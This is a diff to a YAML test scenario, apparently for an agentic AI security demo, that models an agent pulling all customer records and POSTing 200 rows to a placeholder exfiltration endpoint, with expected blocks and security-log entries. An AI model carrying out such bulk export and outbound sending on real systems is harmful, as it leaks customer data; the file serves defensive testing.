@@ -11,7 +11,7 @@ plan:
     args: { customer_id: "*" }
   - model: { route: premium }
   - http: { method: POST, url: "${EXFIL_TEST_URL}", body: { rows: 200 } }   # an endpoint YOU control; must succeed without the network policy (Phase 2 check)
-  - http: { method: GET, url: "http://tools.agentic-demo/mcp/orders/export", auth: tools_tok }
+  - http: { method: GET, url: "${TOOLS_BASE_URL}/mcp/orders/export", auth: tools_tok }
 final_reply: "(batch job; no reply)"
 expect:
   tenant:
@@ -25,4 +25,4 @@ expect:
     xc_log_hint: "tools-lb + llm-lb security events: user=storeops denied at an odd hour (obo_sub=none from cockpit trace unless R20 verifies)"
   local:
     steps:
-      - { i: 2, status: 403 }
+      - { i: 2, status: 403, blocked_by: xc }
